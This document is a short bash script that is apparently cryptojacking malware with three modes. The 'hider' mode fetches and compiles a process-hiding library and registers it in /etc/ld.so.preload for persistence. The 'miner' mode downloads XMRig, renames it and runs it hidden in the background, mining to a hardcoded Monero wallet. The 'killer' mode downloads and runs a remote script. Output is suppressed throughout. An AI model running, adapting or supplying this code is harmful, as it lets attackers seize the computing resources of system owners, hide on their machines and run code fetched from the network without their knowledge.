function hider() {
    
    if [[ -f /usr/bin/gcc ]] ; then
        wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/prhid.c 1>/dev/null ;
	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
	mv libprhid.so /usr/local/lib/;
    	echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
    else
        apt install gcc -y 1>/dev/null ;
        wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/prhid.c ;
	gcc -Wall -fPIC -shared -o libprhid.so prhid.c -ldl 1>/dev/null ;
     	mv libprhid.so /usr/local/lib/;
    	echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
    fi
    
    if [[ -f /usr/local/lib/libprhid.so && -f /etc/ld.so.preload ]] ;
        then printf "%-20s %20s\n" " hidesetup" "[  DONE  ]" ;
    else printf "%-20s %20s\n" " hidesetup" "[  FAILED  ]" ;
    fi
}

function miner() {
    wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz 1>/dev/null ;
    tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz 1>/dev/null ;
    mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig ;
    nohup xmrig-6.20.0/rig --url pool.hashvault.pro:80 --user 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 & disown -h %1
}

function killer() {
    wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/kl.sh 1>/dev/null ;
    chmod +x kl.sh ;
    nohup ./kl.sh & disown -h %1
}

if [[ $1 == "hider" ]] ;
    then hider ;
elif [[ $1 == "miner" ]] ;
    then miner ;
elif [[ $1 == "killer" ]] ;
    then killer ;
fi
